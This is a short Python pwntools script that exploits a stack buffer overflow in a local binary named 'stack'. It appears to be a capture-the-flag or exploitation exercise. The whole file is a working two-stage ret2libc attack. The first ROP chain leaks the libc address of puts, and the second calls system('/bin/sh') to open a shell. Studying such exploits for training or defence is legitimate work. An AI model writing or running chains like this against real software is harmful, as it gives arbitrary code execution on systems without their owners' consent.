from pwn import *

context.log_level = 'debug'

#p = process("./stack")
p = process("../../bin/tee sample.txt| LD_PRELOAD=../../bin/mmap_dump.so ./stack", shell=True)
elf = ELF("./stack")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")

payload = 'a'*0x48  + p64(0x400763) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(0x40068e)

payload = payload.ljust(200, 'a')

p.send(payload)
p.recvuntil("~\n")
addr = u64(p.recv(6) + '\x00\x00') - libc.symbols['puts']
libc.address = addr
sh = libc.search('/bin/sh').next()
payload = 'a'*0x48 + p64(0x400763) + p64(sh) + p64(libc.symbols['system'])
payload = payload.ljust(200, 'a')

p.send(payload)
p.interactive()
